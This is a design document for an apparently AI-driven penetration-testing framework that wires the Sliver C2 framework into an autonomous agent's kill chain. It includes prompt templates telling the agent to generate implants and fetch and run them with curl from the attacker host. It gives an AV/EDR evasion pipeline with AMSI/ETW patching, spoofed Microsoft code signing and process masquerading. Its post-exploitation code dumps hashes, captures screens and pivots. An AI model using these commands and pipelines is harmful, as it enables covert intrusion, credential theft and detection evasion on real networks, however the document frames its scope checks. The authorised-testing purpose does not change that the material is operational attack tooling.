    # Get active sessions
    sessions = await client.sessions()
    for s in sessions:
        print(f"Session: {s.ID} | OS: {s.OS} | User: {s.Username}@{s.Hostname}")

    # Interact with session
    session = await client.interact_session(session_id)

    # Post-exploitation
    whoami = await session.execute("whoami", ["/all"])
    print(whoami.Stdout)

    hashdump = await session.hashdump()
    for h in hashdump.Entries:
        print(f"{h.User}:{h.Hash}")

    screenshot = await session.screenshot()
    with open("/pentest/evidence/screenshot.png", "wb") as f:
        f.write(screenshot.Data)

    # Port forward for pivoting
    await session.portfwd_add(8080, "10.0.0.5", 445)

asyncio.run(post_exploit("abc123"))
```

---

## New Skills

### Skill: `c2_deployment` (NEW)

```yaml
# skills/c2_deployment/skill.yaml
id: c2_deployment
name: C2 Deployment
category: exploitation
phase: EXPLOIT
priority: 95  # Higher than generic exploitation (90)
target_types:
  - lab
  - external
description: >
  After gaining initial access through exploitation, generate a Sliver C2
  implant tailored to the target OS/arch, deliver it via the appropriate
  method (download, upload, injection), and confirm callback reception.
  This is the bridge between exploitation and post-exploitation.
tags:
  - c2
  - sliver
  - implant
  - payload
  - callback
mitre_techniques:
  - T1105   # Ingress Tool Transfer
  - T1059   # Command and Scripting Interpreter
  - T1059.001  # PowerShell
  - T1059.003  # Windows Command Shell
  - T1059.004  # Unix Shell
  - T1071   # Application Layer Protocol
  - T1071.001  # Web Protocols (HTTPS C2)
  - T1071.004  # DNS (DNS C2)
  - T1573   # Encrypted Channel (mTLS)
  - T1132   # Data Encoding
inputs:
  - access.json       # Proof of initial access
  - services.json     # Target OS/arch info
  - tech_fingerprint.json
outputs:
  - c2_session.json   # Session ID, type, callback details
  - evidence.json
  - findings.json
prerequisites:
  - access
tools:
  - sliver-client
  - python3 (http.server for staging)
  - curl / wget / PowerShell (delivery)

evidence_collection:
  - Implant generation command + output
  - Delivery method and command used
  - C2 callback confirmation (session list output)
  - Session info (OS, user, hostname, PID)

success_criteria:
  - Implant generated for correct OS/arch
  - Payload delivered to target
  - C2 callback received within 60 seconds
  - Session/beacon interactive and responsive

safety_notes:
  - Only deploy to explicitly authorized targets
  - Use session mode for lab, beacon for external
  - Clean up implants after engagement
  - Never deploy without confirmed initial access
```

**Skill prompt template (`skills/c2_deployment/examples/prompt.md`):**

```markdown
## C2 Deployment Instructions

You have gained initial access to the target. Your next step is to establish
persistent C2 access via Sliver.

### Steps:
1. **Identify target OS/arch** from prior recon (services.json, tech_fingerprint.json)
2. **Generate implant:**
   - Windows: `sliver-client generate --mtls sliver:8888 --os windows --arch amd64 --format exe --save /tmp/implant.exe`
   - Linux: `sliver-client generate --mtls sliver:8888 --os linux --arch amd64 --format elf --save /tmp/implant`
   - Shellcode (memory-only): add `--format shellcode`
3. **Host payload:** `cd /tmp && python3 -m http.server 8080 &`
4. **Deliver via initial access:**
   - If command exec: `curl http://<kali_ip>:8080/implant.exe -o C:\Windows\Temp\svc.exe && C:\Windows\Temp\svc.exe`
   - If file upload: upload through the vulnerability
   - If web shell: use shell to wget/curl
5. **Verify callback:** `sliver-client sessions` — confirm new session appears
6. **Record session ID** in c2_session.json for post-exploitation phase

### Success = Session callback received. Failure = retry with different format/delivery.
```

### Skill: `c2_evasion` (NEW)

```yaml
# skills/c2_evasion/skill.yaml
id: c2_evasion
name: C2 Evasion & Payload Hardening
category: evasion
phase: EXPLOIT
priority: 93  # After initial generation (95), before delivery
target_types:
  - lab
  - external
description: >
  Harden Sliver implants against AV/EDR detection before delivery.
  Applies a multi-layer evasion pipeline: shellcode generation, Donut
  processing (AMSI/ETW bypass), ScareCrow wrapping (EDR unhooking,
  indirect syscalls, code signing), and pre-flight testing against
  Defender/ThreatCheck. Selects evasion intensity based on detected
  target defenses. Maintains a library of pre-tested "golden" implants
  for rapid deployment.
tags:
  - evasion
  - av-bypass
  - edr-bypass
  - amsi
  - etw
  - scarecrow
  - donut
  - obfuscation
mitre_techniques:
  - T1027       # Obfuscated Files or Information
  - T1027.001   # Binary Padding
  - T1027.002   # Software Packing
  - T1027.003   # Steganography
  - T1027.005   # Indicator Removal from Tools
  - T1027.009   # Embedded Payloads
  - T1027.013   # Encrypted/Encoded File
  - T1140       # Deobfuscate/Decode Files or Information
  - T1553.002   # Code Signing (spoofed certs via ScareCrow)
  - T1562.001   # Disable or Modify Tools (AMSI/ETW patching)
  - T1574.002   # DLL Side-Loading
  - T1055       # Process Injection
  - T1055.001   # Dynamic-link Library Injection
  - T1055.012   # Process Hollowing
  - T1218       # System Binary Proxy Execution
  - T1036       # Masquerading
  - T1036.005   # Match Legitimate Name or Location
inputs:
  - access.json           # Target info (OS, arch, defenses)
  - services.json         # What AV/EDR is running
  - tech_fingerprint.json # Detailed defense enumeration
outputs:
  - evasion_report.json   # What evasion was applied + test results
  - payload_manifest.json # Final payload path, format, delivery instructions
  - evidence.json
prerequisites:
  - access
tools:
  - sliver-client (shellcode generation)
  - ScareCrow (EDR bypass loader)
  - donut (PE-to-shellcode + AMSI/ETW bypass)
  - ThreatCheck (pre-flight AV testing)
  - python3 (pre-flight script, entropy analysis)

evidence_collection:
  - Evasion pipeline steps applied
  - Pre-flight test results (ThreatCheck output)
  - Payload entropy score
  - ScareCrow loader type selected
  - Code signing details (if applied)

success_criteria:
  - Payload passes pre-flight ThreatCheck (no detections)
  - File entropy below 7.9 (avoids heuristic flags)
  - Evasion method matched to target defenses
  - Payload format matched to delivery method

safety_notes:
  - NEVER upload payloads to VirusTotal (burns signatures)
  - Pre-flight test in isolated environment only
  - Golden implants expire — re-test monthly
  - External engagements MUST use full evasion chain
  - Document all evasion techniques for report
```

**Skill prompt template (`skills/c2_evasion/examples/prompt.md`):**

```markdown
## Evasion Pipeline Instructions

You need to prepare a stealthy payload before delivering it to the target.

### Assess Target Defenses:
1. Check services.json / tech_fingerprint.json for AV/EDR indicators
2. Look for: Windows Defender, CrowdStrike, SentinelOne, Carbon Black, Cortex XDR, MDE

### Apply Evasion (match to defenses):

**If Defender only (or unknown):**
1. `sliver-client generate --mtls sliver:8888 --os windows --arch amd64 --format shellcode --save /tmp/raw.bin --evasion`
2. `ScareCrow -I /tmp/raw.bin -Loader dll -domain microsoft.com -sign`
3. `ThreatCheck -f /tmp/output.dll -e AMSI` → must show "No threat found"

**If EDR detected (CrowdStrike, S1, etc.):**
1. Generate shellcode (same as above)
2. `donut -i /tmp/raw.bin -o /tmp/donut.bin -a 2 -e 3 -z 2 -b 1 -k 1` (AMSI+ETW bypass)
3. `ScareCrow -I /tmp/donut.bin -Loader dll -domain microsoft.com -sign -process RuntimeBroker.exe`
4. Pre-flight test
5. If still detected → try different ScareCrow loader (wscript, control, msiexec)

**If no AV (lab):**
1. Skip evasion — use raw Sliver implant for speed

### Pre-Flight Test (MANDATORY for external targets):
- `ThreatCheck -f /tmp/payload.dll -e AMSI`
- Check entropy: `python3 -c "import math; d=open('/tmp/payload.dll','rb').read(); print(-sum((c/len(d))*math.log2(c/len(d)) for c in [d.count(bytes([b])) for b in range(256)] if c>0))"`
- If entropy > 7.9 or ThreatCheck fails → regenerate

### Record results in evasion_report.json
```

### Skill: `c2_post_exploit` (NEW)

```yaml
# skills/c2_post_exploit/skill.yaml
id: c2_post_exploit
name: C2 Post-Exploitation
category: post_exploitation
phase: POST_EXPLOIT
priority: 85
target_types:
  - lab
  - external
description: >
  Use an established Sliver C2 session to perform post-exploitation:
  credential dumping, privilege escalation, lateral movement, data collection,
  and persistence. Operates entirely through the C2 channel.
tags:
  - c2
  - sliver
  - post-exploit
  - hashdump
  - privesc
  - lateral
mitre_techniques:
  - T1003       # OS Credential Dumping
  - T1003.001   # LSASS Memory
  - T1003.002   # SAM
  - T1003.004   # LSA Secrets
  - T1078       # Valid Accounts (from dumped creds)
  - T1055       # Process Injection
  - T1134       # Access Token Manipulation
  - T1021       # Remote Services (lateral)
  - T1572       # Protocol Tunneling (pivots)
  - T1090       # Proxy (port forwarding)
  - T1113       # Screen Capture
  - T1056.001   # Keylogging
  - T1005       # Data from Local System
inputs:
  - c2_session.json
  - access.json
outputs:
  - creds.json
  - priv_esc.json
  - lateral.json
  - evidence.json
  - findings.json
prerequisites:
  - c2_session
tools:
  - sliver-client
  - sliver-py (Python gRPC)

evidence_collection:
  - hashdump output
  - Screenshot captures
  - Credential material extracted
  - Pivot/tunnel configurations
  - Lateral movement proof (whoami on new hosts)

success_criteria:
  - Credentials extracted from target
  - Privilege escalation attempted (SYSTEM/root)
  - At least one lateral movement path validated
  - Evidence artifacts saved to MinIO

safety_notes:
  - Credential material must be stored securely (encrypted at rest in MinIO)
  - Lateral movement only to in-scope hosts
  - Screenshot/keylogger only on authorized targets
  - Clean up all artifacts post-engagement
```

### Updates to Existing Skills

**`skills/exploitation/skill.yaml`** — Add C2 deployment as next step:

```yaml
# Add to outputs:
outputs:
  - access.json
  - evidence.json
  - findings.json
  - c2_handoff.json    # NEW: signals c2_deployment skill to activate

# Add to success_criteria:
success_criteria:
  - Exploit validated safely
  - Proof of impact captured
  - MITRE technique documented
  - C2 handoff prepared (target OS/arch, access method documented)  # NEW
```

**`skills/persistence/skill.yaml`** — Add Sliver beacon as persistence option:

```yaml
# Add to mitre_techniques:
mitre_techniques:
  - T1573   # Encrypted Channel (Sliver beacon persistence)

# Add to description:
description: >
  ...existing text...
  Can leverage Sliver beacons for persistent C2 access with configurable
  check-in intervals and jitter for stealth.
```

---

## Phase Gate Changes

### Current Flow (Broken)

```
EXPLOIT → "proof of access" → agent flounders → never transitions to POST_EXPLOIT
```

### New Flow (With C2 Gate)

```
EXPLOIT ──▶ C2_DEPLOY ──▶ C2_CONFIRM ──▶ POST_EXPLOIT (via C2)
                │              │
           Generate +     Callback
           deliver        received?
           implant        ├── YES → proceed
                          └── NO → retry (different format/delivery)
                                   └── 3 failures → fallback to manual post-exploit
```

### Implementation in `dynamic_agent.py`

The phase state machine needs a new transition:

```python
# Phase transitions (add to dynamic_agent.py)
PHASE_TRANSITIONS = {
    "RECON": "VULN_SCAN",
    "VULN_SCAN": "EXPLOIT",
    "EXPLOIT": "C2_DEPLOY",      # NEW: exploitation success triggers C2 deployment
    "C2_DEPLOY": "POST_EXPLOIT",  # NEW: C2 callback triggers post-exploitation
    "POST_EXPLOIT": "LATERAL",
    "LATERAL": "REPORT",
    "REPORT": "COMPLETE",
}

# C2 deployment gate
C2_GATE = {
    "trigger": "access_gained",           # When access.json has entries
    "action": "inject_c2_deployment",     # Load c2_deployment skill
    "success": "c2_session_established",  # c2_session.json has active session
    "failure_retries": 3,                 # Retry with different payload format
    "fallback": "manual_post_exploit",    # Skip C2 if all attempts fail
    "timeout_seconds": 120,              # Max wait for callback
}
```

### New Artifact: `c2_session.json`

```json
{
  "sessions": [
    {
      "session_id": "abc123-def456",
      "type": "session",
      "target_ip": "192.168.4.125",
      "target_os": "windows",
      "target_arch": "amd64",
      "username": "DESKTOP-ABC\\user",
      "hostname": "DESKTOP-ABC",
      "pid": 4832,
      "transport": "mtls",
      "callback_host": "sliver:8888",
      "implant_name": "tazosploit-session",
      "implant_format": "exe",
      "delivery_method": "powershell_download",
      "established_at": "2026-02-15T15:30:00Z"
    }
  ],
  "listeners": [
    {
      "type": "mtls",
      "host": "0.0.0.0",
      "port": 8888
    }
  ]
}
```

---

## Kali Container Changes

### Install Sliver Client in Kali

Add to `kali-executor/Dockerfile`:

```dockerfile
# --- Sliver Client ---
# Download Sliver client binary (not server — client only)
RUN curl -sSL https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux-arm64 \
    -o /usr/local/bin/sliver-client && \
    chmod +x /usr/local/bin/sliver-client

# Install sliver-py for programmatic gRPC interaction
RUN pip3 install sliver-py grpcio protobuf

# Copy operator config (generated by Sliver server)
COPY configs/kali-operator.cfg /opt/sliver/kali-operator.cfg
```

### Shared Volumes

```yaml
# docker-compose.yml updates for Kali containers
kali:
  volumes:
    - sliver-output:/opt/sliver/output:ro    # Read generated implants
    - sliver-configs:/opt/sliver/configs:ro  # Operator config for client auth
    # ... existing volumes ...
```

### Environment Variables

```yaml
environment:
  - SLIVER_SERVER=sliver:31337                    # gRPC endpoint
  - SLIVER_CONFIG=/opt/sliver/configs/kali-operator.cfg
  - SLIVER_LISTENER_HOST=0.0.0.0
  - SLIVER_LISTENER_PORT=8888
  - SLIVER_TRANSPORT=mtls                         # Default transport
  - C2_ENABLED=true                               # Feature flag
```

### Network Access

The Kali containers already have routes to 192.168.4.0/24 (lab targets) and lab-net. They need access to the Sliver server container:

```yaml
# Kali containers need kali-net access to reach sliver container
networks:
  - kali-net   # Already present — sliver container also on kali-net
  - lab-net    # Already present — for target access
```

---

## Security & Safety Controls

### Feature Flag

```python
# C2 deployment is gated by feature flag
C2_ENABLED = os.getenv("C2_ENABLED", "false").lower() == "true"

# Only enable for lab profile by default
if job.profile == "lab":
    c2_enabled = True
elif job.profile == "external":
    c2_enabled = job.config.get("c2_authorized", False)  # Explicit opt-in
```

### Scope Enforcement

```python
# Before generating implant, verify target is in scope
def validate_c2_target(target_ip: str, job_scope: list) -> bool:
    """Only deploy C2 to explicitly authorized targets."""
    return target_ip in job_scope

# Before lateral movement via C2, verify destination
def validate_pivot_target(destination_ip: str, job_scope: list) -> bool:
    """Lateral movement only to scoped hosts."""
    return destination_ip in job_scope
```

### Cleanup Protocol

```python
# After job completion, clean up C2 artifacts
async def cleanup_c2(session_id: str, client: SliverClient):
    """Remove implant and close session."""
    session = await client.interact_session(session_id)

    # Kill the implant process on target
    await session.kill()

    # Remove implant file if dropped to disk
    # (path stored in c2_session.json)
    pass

    # Close the session
    await client.session_kill(session_id)
```

### Credential Handling

- All dumped credentials encrypted before storage in MinIO
- Credential material auto-expires after job TTL
- Never log credential hashes to stdout/Redis streams

---

## MITRE ATT&CK Mapping

### New Coverage (C2 Integration + Evasion)

| Technique | ID | Phase | Tool / Command |
|-----------|----|-------|----------------|
| **C2 Deployment** | | | |
| Ingress Tool Transfer | T1105 | C2_DEPLOY | `generate` + delivery |
| Application Layer Protocol: Web | T1071.001 | C2_DEPLOY | HTTPS listener |
| Application Layer Protocol: DNS | T1071.004 | C2_DEPLOY | DNS listener |
| Encrypted Channel: Asymmetric | T1573.002 | C2_DEPLOY | mTLS transport |
| **Evasion** | | | |
| Obfuscated Files: Software Packing | T1027.002 | EVASION | ScareCrow + Donut |
| Obfuscated Files: Encrypted/Encoded | T1027.013 | EVASION | AES/RC4 encryption (ScareCrow) |
| Obfuscated Files: Indicator Removal | T1027.005 | EVASION | Garble obfuscation (Sliver --evasion) |
| Obfuscated Files: Embedded Payloads | T1027.009 | EVASION | DLL sideloading payload |
| Code Signing (spoofed) | T1553.002 | EVASION | ScareCrow `-sign` |
| Disable/Modify Tools (AMSI) | T1562.001 | EVASION | Donut AMSI patch / PowerShell bypass |
| Disable/Modify Tools (ETW) | T1562.001 | EVASION | Donut ETW patch |
| DLL Side-Loading | T1574.002 | EVASION | ScareCrow DLL loader |
| Process Hollowing | T1055.012 | EVASION | Custom hollowing loader |
| Masquerading: Match Legitimate Name | T1036.005 | EVASION | Process name spoofing |
| System Binary Proxy Execution | T1218 | EVASION | msiexec/control panel loaders |
| **Post-Exploitation** | | | |
| OS Credential Dumping: SAM | T1003.002 | POST_EXPLOIT | `hashdump` |
| OS Credential Dumping: LSASS | T1003.001 | POST_EXPLOIT | `procdump` / Mimikatz |
| OS Credential Dumping: LSA Secrets | T1003.004 | POST_EXPLOIT | `execute-assembly Seatbelt` |
| Screen Capture | T1113 | POST_EXPLOIT | `screenshot` |
| Keylogging | T1056.001 | POST_EXPLOIT | `keylogger` |
| Protocol Tunneling | T1572 | POST_EXPLOIT | `pivots tcp` |
| Proxy | T1090 | POST_EXPLOIT | `portfwd` |
| Process Injection | T1055 | POST_EXPLOIT | `inject` / `migrate` |
| Access Token Manipulation | T1134 | POST_EXPLOIT | `impersonate` / `getsystem` |
| Data from Local System | T1005 | POST_EXPLOIT | `download` |
| **Runtime Evasion** | | | |
| Virtualization/Sandbox Evasion | T1497 | POST_EXPLOIT | Sleep obfuscation (encrypted memory) |
| Process Migration | T1055.001 | POST_EXPLOIT | `migrate -p <PID>` |
| SOCKS Proxy | T1090.001 | POST_EXPLOIT | `socks5 start` + proxychains |

### Total MITRE Coverage After Integration

- **Before:** 265 techniques (125 skills)
- **After:** ~295 techniques (+30 new via Sliver C2 + Evasion Pipeline)

---

## Implementation Plan

### Phase 1: Foundation (Days 1-3)

1. **Sliver server container** — Dockerfile, docker-compose entry, health check
2. **Operator config generation** — Auto-generate Kali client configs on first boot
3. **Kali Dockerfile update** — Install `sliver-client` binary + `sliver-py`
4. **Shared volumes** — Output dir for generated implants, config dir for operator creds
5. **mTLS listener auto-start** — Sliver starts mTLS listener on container boot
6. **Test:** Kali container can connect to Sliver server, generate implant, and list sessions

### Phase 2: C2 Deployment Skill (Days 4-6)

1. **Create `skills/c2_deployment/`** — skill.yaml, prompt templates, examples
2. **Payload generation wrapper** — Python script in Kali that wraps `sliver-client generate`
3. **Delivery methods** — Implement download+execute, upload, injection flows
4. **Callback verification** — Script that polls `sliver-client sessions` for new callbacks
5. **c2_session.json artifact** — Write session details for post-exploitation phase
6. **Test:** Run against DVWA → exploit file upload → deploy implant → get callback

### Phase 3: C2 Post-Exploitation Skill (Days 7-9)

1. **Create `skills/c2_post_exploit/`** — skill.yaml, prompt templates
2. **sliver-py integration** — Python scripts for hashdump, screenshot, portfwd, pivots
3. **Evidence collection** — Auto-save all C2 outputs to MinIO evidence bucket
4. **Credential extraction pipeline** — hashdump → creds.json → auto-tracker update
5. **Test:** Full chain: exploit → C2 deploy → hashdump → screenshot → findings reported

### Phase 4: Phase Gate Integration (Days 10-12)

1. **Update `dynamic_agent.py`** — Add C2_DEPLOY phase transition
2. **Exploit → C2 handoff** — Automatic skill injection after access gained
3. **C2 gate** — Block POST_EXPLOIT until C2 session confirmed (with fallback)
4. **Supervisor awareness** — Supervisor monitors C2 session health
5. **Cleanup protocol** — Auto-kill sessions after job completion
6. **Test:** End-to-end: start job → recon → vuln scan → exploit → C2 → post-exploit → report

### Phase 5: Evasion Pipeline (Days 13-17)

1. **Install evasion tools in Kali** — ScareCrow, Donut, ThreatCheck, SharpCollection
2. **Create `skills/c2_evasion/`** — skill.yaml, prompt templates, decision matrix
3. **Evasion wrapper scripts** — `evasion_pipeline.py` (orchestrates shellcode → Donut → ScareCrow → test)
4. **Pre-flight testing** — `pre_flight_test.py` (ThreatCheck + entropy + Defender check)
5. **Golden implant library** — Pre-build + test common OS/arch/transport combos
6. **Defense detection** — Agent identifies target AV/EDR from recon and selects evasion level
7. **Transport evasion** — HTTPS C2 profiles, DNS C2, named pipes for lateral
8. **Test:** Generate evasion payload → ThreatCheck clean → deliver to Defender-enabled VM → no detection

### Phase 6: Hardening & Polish (Days 18-20)

1. **Beacon mode** for external engagements (configurable intervals)
2. **Sleep obfuscation** — Encrypted memory while beacon sleeps
3. **Pivot automation** — C2 agent auto-creates pivots for multi-host engagements
4. **Process migration** — Move implant between processes to evade detection
5. **Monitoring dashboard** — Frontend shows C2 sessions, implant status, evasion method used
6. **Golden implant rotation** — Monthly re-test + regenerate golden implants
7. **Documentation** — Update ARCHITECTURE.md, QUICKSTART.md, skill catalog

---

## Testing Strategy

### Unit Tests

```python
# tests/test_c2_integration.py

def test_implant_generation():
    """Verify implant generates for all OS/arch combos."""
    for os in ["windows", "linux", "darwin"]:
        for arch in ["amd64", "arm64"]:
            result = generate_implant(os=os, arch=arch, format="exe")
            assert result.path.exists()
            assert result.size > 0

def test_payload_decision_matrix():
    """Verify correct payload format selected based on target info."""
    assert select_payload_format("windows", "rce") == "exe"
    assert select_payload_format("windows", "dll_hijack") == "shared"
    assert select_payload_format("linux", "rce") == "elf"
    assert select_payload_format("any", "memory_only") == "shellcode"

def test_c2_session_artifact():
    """Verify c2_session.json schema."""
    session = create_c2_session_artifact(session_id="abc", target="192.168.4.125")
    assert session["sessions"][0]["session_id"] == "abc"
    assert session["sessions"][0]["target_ip"] == "192.168.4.125"
```

### Integration Tests (Lab)

| Test | Target | Expected Outcome |
|------|--------|------------------|
| **DVWA file upload → Sliver** | DVWA container | Upload PHP shell → download implant → callback |
| **JuiceShop RCE → Sliver** | JuiceShop container | Exploit Node.js RCE → execute implant → callback |
| **Windows VM exploit → Sliver** | 192.168.4.125 | Exploit SMB/RDP → drop implant → session + hashdump |
| **Full kill chain** | Multi-target | Recon → scan → exploit → C2 → post-exploit → report |
| **Beacon persistence** | Windows VM | Deploy beacon → reboot VM → beacon reconnects |
| **Pivot chain** | DMZ → Internal | Exploit DMZ → C2 → pivot → exploit internal host |

### Validation Criteria

A job is **truly successful** when:
1. ✅ Vulnerability exploited (proof of access)
2. ✅ Sliver implant deployed and callback received
3. ✅ Credentials extracted via C2 session
4. ✅ At least one post-exploitation action completed
5. ✅ All evidence stored in MinIO
6. ✅ Findings reported with MITRE mapping
7. ✅ C2 session cleaned up after job completion

---

## Quick Start (After Implementation)

```bash
# 1. Start the full stack (includes Sliver server)
cd ~/Documents/PenTest/TazoSploit
docker compose up -d

# 2. Verify Sliver is running
docker exec tazosploit-sliver sliver-client sessions

# 3. Start a job with C2 enabled
curl -X POST http://localhost:8000/api/jobs \
  -H "Content-Type: application/json" \
  -d '{
    "targets": ["192.168.4.125"],
    "phase": "FULL",
    "profile": "lab",
    "config": {
      "c2_enabled": true,
      "c2_transport": "mtls",
      "c2_implant_type": "session",
      "max_iterations": 5000
    }
  }'

# 4. Watch the magic
# Job: RECON → VULN_SCAN → EXPLOIT → C2_DEPLOY → POST_EXPLOIT → REPORT
```

---

## File Map

```
TazoSploit/
├── sliver-server/                    # NEW: Sliver server container
│   ├── Dockerfile
│   ├── entrypoint.sh
│   └── configs/
│       └── server.yaml
├── kali-executor/
│   ├── Dockerfile                    # UPDATED: + sliver-client + sliver-py
│   ├── dynamic_agent.py              # UPDATED: + C2_DEPLOY phase + evasion logic
│   └── scripts/
│       ├── generate_implant.py       # NEW: Wrapper for sliver generate
│       ├── evasion_pipeline.py       # NEW: Orchestrates shellcode → Donut → ScareCrow
│       ├── pre_flight_test.py        # NEW: ThreatCheck + entropy + Defender validation
│       ├── deliver_payload.py        # NEW: Payload delivery methods
│       ├── verify_callback.py        # NEW: Poll for C2 callback
│       └── c2_post_exploit.py        # NEW: Post-exploit via sliver-py
├── golden-implants/                  # NEW: Pre-built tested implants
│   ├── windows/x64/
│   ├── windows/x86/
│   ├── linux/x64/
│   └── shellcode/
├── skills/
│   ├── c2_deployment/                # NEW
│   │   ├── skill.yaml
│   │   ├── examples/
│   │   │   └── prompt.md
│   │   └── scripts/
│   │       └── deploy_c2.sh
│   ├── c2_evasion/                   # NEW: AV/EDR bypass pipeline
│   │   ├── skill.yaml
│   │   ├── examples/
│   │   │   └── prompt.md
│   │   └── scripts/
│   │       ├── evasion_pipeline.sh
│   │       └── pre_flight.py
│   ├── c2_post_exploit/              # NEW
│   │   ├── skill.yaml
│   │   └── examples/
│   │       └── prompt.md
│   ├── exploitation/                 # UPDATED: c2_handoff output
│   │   └── skill.yaml
│   ├── persistence/                  # UPDATED: Sliver beacon option
│   │   └── skill.yaml
│   ├── defense_evasion/              # UPDATED: Sliver runtime evasion
│   │   └── skill.yaml
│   └── lateral_movement/             # UPDATED: Sliver pivot support
│       └── skill.yaml
├── docker-compose.yml                # UPDATED: + sliver service
└── docs/
    └── SLIVER_C2_INTEGRATION.md      # THIS FILE
```
